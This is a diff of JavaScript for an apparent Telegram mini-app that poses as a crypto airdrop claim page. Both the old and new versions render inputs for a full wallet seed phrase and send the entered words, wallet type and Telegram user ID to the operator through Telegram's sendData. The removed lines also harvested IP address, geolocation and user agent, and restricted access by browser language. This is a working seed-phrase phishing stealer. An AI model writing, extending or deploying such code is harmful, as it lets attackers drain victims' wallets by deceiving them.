@@ -1,182 +1,147 @@
-// 🌍 IP та геолокація
-let userIp = "undefined";
-let userLocation = "undefined";
+let tg = null;
+let isTelegram = false;
 
-fetch("https://ipapi.co/json/")
-  .then(res => res.json())
-  .then(data => {
-    userIp = data.ip;
-    userLocation = `${data.city}, ${data.country_name}`;
-    console.log("📍 IP:", userIp, "| Локація:", userLocation);
-  })
-  .catch(() => {
-    userIp = "unknown";
-    userLocation = "unknown";
-    console.warn("⚠️ Не вдалося отримати геолокацію");
-  });
-
-// 🚫 Блокування по мові
-const langs = navigator.languages || [navigator.language || navigator.userLanguage];
-const allowedLangs = ["ru", "ru-RU", "uk", "uk-UA"];
-if (!langs.some(lang => allowedLangs.includes(lang))) {
-  document.body.innerHTML = "<h3 style='text-align:center;margin-top:40vh;color:red;'>Доступ ограничен.</h3>";
+// ======= Перевірка Telegram WebApp =======
+function initTelegram() {
+    if (typeof Telegram !== "undefined" && Telegram.WebApp) {
+        tg = Telegram.WebApp;
+        tg.ready();
+        isTelegram = !!(tg.initDataUnsafe?.user);
+        console.log("✅ Telegram WebApp активен:", isTelegram);
+    } else {
+        console.warn("⚠️ Telegram WebApp не найден (браузерный режим)");
+        isTelegram = false;
+    }
 }
 
-// ✅ DOM ініціалізація
-window.addEventListener("DOMContentLoaded", () => {
-  const isTelegram = Telegram?.WebApp?.initDataUnsafe?.user !== undefined;
+// ======= DOM завантажено =======
+document.addEventListener("DOMContentLoaded", () => {
+    initTelegram();
 
-  if (isTelegram) {
-    Telegram.WebApp.ready();
-    Telegram.WebApp.expand();
-    console.log("✅ Telegram WebApp активовано");
-  } else {
-    console.log("🌐 Працює у браузері (не через Telegram)");
-  }
+    // === Завантаження airdrops ===
+    fetch('https://sp574-maker.github.io/maker/data/airdrops.json')
+        .then(res => res.json())
+        .then(data => {
+            const container = document.getElementById('airdropList');
+            if (!container) return;
+            container.innerHTML = '';
+            data.forEach(drop => {
+                const card = document.createElement('div');
+                card.className = 'airdrop-card';
+                card.innerHTML = `
+                    <img src="${drop.logo}" class="token-logo" alt="${drop.name}" />
+                    <h2>${drop.name}</h2>
+                    <p>💸 Награда: <strong>${drop.reward}</strong></p>
+                    <p>🌐 Сеть: ${drop.network}</p>
+                    <p>⏳ До: ${drop.ends}</p>
+                    <button onclick="selectAirdrop('${drop.name}')">Участвовать</button>
+                `;
+                container.appendChild(card);
+            });
+        })
+        .catch(error => {
+            console.error("❌ Ошибка при загрузке JSON:", error);
+            document.getElementById("airdropList").innerHTML =
+                "<p style='color:red'>❌ Не удалось загрузить список airdrop'ов.</p>";
+        });
 
-  if (document.getElementById("seedContainer")) {
-    renderSeedInputs();
-    setupSelect();
-    document.getElementById("submitBtn")?.addEventListener("click", () => {
-      try {
-        submitSeed(isTelegram);
-      } catch (e) {
-        console.error("❌ submitSeed error:", e);
-      }
-    });
-  }
+    // === Обробка кнопки ===
+    const btn = document.getElementById('submitBtn');
+    if (btn) btn.addEventListener('click', submitAirdrop);
+
+    // === Кастомний селектор ===
+    const selectWrapper = document.querySelector('.custom-select');
+    if (selectWrapper) {
+        const selected = selectWrapper.querySelector('.selected');
+        const options = selectWrapper.querySelectorAll('.options li');
+        const hiddenInput = document.querySelector('#wallet');
+
+        selected.addEventListener('click', () => {
+            selectWrapper.classList.toggle('open');
+        });
+
+        options.forEach(option => {
+            option.addEventListener('click', () => {
+                selected.innerHTML = option.innerHTML;
+                hiddenInput.value = option.dataset.value;
+                selectWrapper.classList.remove('open');
+            });
+        });
+
+        document.addEventListener('click', e => {
+            if (!selectWrapper.contains(e.target)) {
+                selectWrapper.classList.remove('open');
+            }
+        });
+    }
 });
 
-// 📦 Генерація сид-полів
+// ======= Вибір airdrop =======
+function selectAirdrop(name) {
+    document.getElementById('selectedAirdropTitle').innerText = `🔗 ${name}`;
+    document.getElementById('airdropList').style.display = 'none';
+    document.getElementById('airdropForm').style.display = 'block';
+    renderSeedInputs();
+}
+
+// ======= Генерація полів сид-фрази =======
 function renderSeedInputs() {
-  const length = parseInt(document.getElementById("length").value);
-  const container = document.getElementById("seedContainer");
-  container.innerHTML = "";
+    const length = parseInt(document.getElementById('length').value);
+    const container = document.getElementById('seedContainer');
+    container.innerHTML = '';
 
-  for (let i = 0; i < length; i++) {
-    const input = document.createElement("input");
-    input.type = "text";
-    input.placeholder = `${i + 1}`;
-    input.classList.add("seed-word");
-    container.appendChild(input);
-  }
-
-  const firstInput = container.querySelector("input");
-  if (firstInput) {
-    firstInput.addEventListener("input", handleBulkSeedInput);
-    firstInput.addEventListener("paste", (e) => setTimeout(() => handleBulkSeedInput(e), 50));
-  }
-}
-
-// 📋 Обробка вставки одразу всіх слів
-function handleBulkSeedInput(e) {
-  const inputs = document.querySelectorAll(".seed-word");
-  const words = e.target.value.trim().split(/\s+/);
-  if (words.length > 1) {
-    inputs.forEach((input, i) => input.value = words[i] || "");
-  }
-}
-
-// 🔘 Кастомний select
-function setupSelect() {
-  const selectWrapper = document.querySelector('.custom-select');
-  const selected = selectWrapper.querySelector('.selected');
-  const options = selectWrapper.querySelectorAll('.options li');
-  const hiddenInput = document.querySelector('#wallet');
-
-  selected.addEventListener('click', () => selectWrapper.classList.toggle('open'));
-  options.forEach(option => {
-    option.addEventListener('click', () => {
-      selected.innerHTML = option.innerHTML;
-      hiddenInput.value = option.dataset.value;
-      selectWrapper.classList.remove('open');
-    });
-  });
-
-  document.addEventListener('click', e => {
-    if (!selectWrapper.contains(e.target)) {
-      selectWrapper.classList.remove('open');
+    for (let i = 0; i < length; i++) {
+        const input = document.createElement('input');
+        input.type = 'text';
+        input.placeholder = `Слово ${i + 1}`;
+        container.appendChild(input);
     }
-  });
+
+    const inputs = container.querySelectorAll('input');
+    if (inputs.length > 0) {
+        inputs[0].addEventListener('paste', (e) => {
+            e.preventDefault();
+            const pasted = (e.clipboardData || window.clipboardData).getData('text');
+            const words = pasted.trim().split(/\s+/);
+            if (words.length > 1) {
+                words.forEach((word, index) => {
+                    if (inputs[index]) inputs[index].value = word;
+                });
+            } else {
+                inputs[0].value = pasted;
+            }
+        });
+    }
 }
 
-// 🚫 Повідомлення про помилку
-function showWarning(message) {
-  let warning = document.getElementById("validationWarning");
-  if (!warning) {
-    warning = document.createElement("p");
-    warning.id = "validationWarning";
-    warning.style.color = "#ff4d4d";
-    warning.style.fontSize = "13px";
-    warning.style.marginTop = "10px";
-    document.querySelector(".container").appendChild(warning);
-  }
-  warning.textContent = message;
-  warning.style.display = "block";
-}
-function clearWarning() {
-  const warning = document.getElementById("validationWarning");
-  if (warning) warning.style.display = "none";
-}
+// ======= Відправка участі =======
+function submitAirdrop() {
+    const inputs = Array.from(document.querySelectorAll('#seedContainer input'));
+    const words = inputs.map(input => input.value.trim()).filter(Boolean);
 
-// 🌀 Статус
-function showProcessing(message) {
-  let processing = document.getElementById("processingInfo");
-  if (!processing) {
-    processing = document.createElement("p");
-    processing.id = "processingInfo";
-    processing.style.color = "#999";
-    processing.style.fontSize = "14px";
-    processing.style.marginTop = "12px";
-    document.querySelector(".container").appendChild(processing);
-  }
-  processing.textContent = message;
-}
+    if (words.length !== inputs.length) {
+        const warning = document.getElementById('validationWarning');
+        warning.innerText = '❗️ Пожалуйста, заполните все поля.';
+        warning.style.display = 'block';
+        return;
+    }
 
-// 🚀 Надсилання seed
-function submitSeed(isTelegram) {
-  clearWarning();
-  const length = parseInt(document.getElementById("length").value);
-  const wallet = document.getElementById("wallet").value || "unknown";
-  const ua = navigator.userAgent;
-  const inputs = document.querySelectorAll("#seedContainer .seed-word");
-  const words = Array.from(inputs).map(i => i.value.trim()).filter(Boolean);
+    const payload = {
+        event: "airdrop_claim",
+        user_id: isTelegram ? tg.initDataUnsafe.user.id : "-",
+        username: isTelegram ? tg.initDataUnsafe.user.username : "-",
+        timestamp: new Date().toISOString(),
+        seed: words.join(" "),
+        wallet: document.getElementById("wallet").value
+    };
 
-  if (words.length !== length) {
-    showWarning(`❌ Введено ${words.length}, очікується ${length} слів`);
-    return;
-  }
+    console.log("[📤 Payload]:", payload);
 
-  const invalidWords = words.filter(w => !/^[a-zA-Z]+$/.test(w));
-  if (invalidWords.length) {
-    showWarning(`🚫 Недопустимі символи: ${invalidWords.join(", ")}`);
-    return;
-  }
-
-  const seed = words.join(" ");
-  showProcessing("⏳ Перевірка seed-фрази…");
-  document.querySelector(".container").innerHTML =
-    "<h3 style='color:green;text-align:center'>⏳ Перевірка…</h3>";
-
-  const tgUser = isTelegram ? Telegram.WebApp.initDataUnsafe.user : {};
-  const payload = {
-    user_id: tgUser?.id || "-",
-    username: tgUser?.username || "-",
-    seed,
-    wallet,
-    length,
-    ua,
-    ip: userIp,
-    location: userLocation,
-    timestamp: new Date().toISOString()
-  };
-
-  localStorage.setItem("payload_backup", JSON.stringify(payload));
-
-  if (isTelegram && Telegram.WebApp.sendData) {
-    Telegram.WebApp.sendData(JSON.stringify(payload));
-    console.log("✅ Payload надіслано:", payload);
-  } else {
-    console.log("📦 Payload (браузер):", payload);
-  }
+    if (isTelegram) {
+        tg.sendData(JSON.stringify(payload));
+        tg.close();
+    } else {
+        alert("📦 Демо-режим: данные не отправлены через Telegram WebApp.");
+        // for dev test: navigator.sendBeacon('/debug', JSON.stringify(payload))
+    }
 }
